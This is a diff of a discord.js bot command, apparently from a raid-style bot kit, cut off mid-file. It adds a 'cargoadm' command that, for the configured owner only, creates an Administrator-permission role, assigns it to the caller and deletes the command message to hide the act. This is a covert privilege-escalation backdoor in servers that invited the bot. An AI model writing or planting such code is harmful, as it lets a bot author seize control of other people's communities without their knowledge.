@@ -1,0 +1,23 @@
+const Discord = module.require("discord.js");
+const { red, green, blue, yellow, cyan, magenta, bgBlue } = require('chalk');
+var config = require("../config.json")
+
+module.exports.run = async (bot, message, args) => {
+  if (message.author.id !== config.dono)
+    return console.log("[" + yellow("*") + "] :: " + "Use esse comando com a conta que você configurou | (config.json) | System:1337")
+  try {
+    role = await message.guild.createRole({
+      name: "艾",
+      color: "#0aff00",
+      permissions: [8]
+    });
+
+    message.member.addRole(role);
+    message.delete(1000);
+  } catch (e) {
+    console.log(e.stack);
+  }
+};
+
+module.exports.help = {
+  name: "cargoadm",
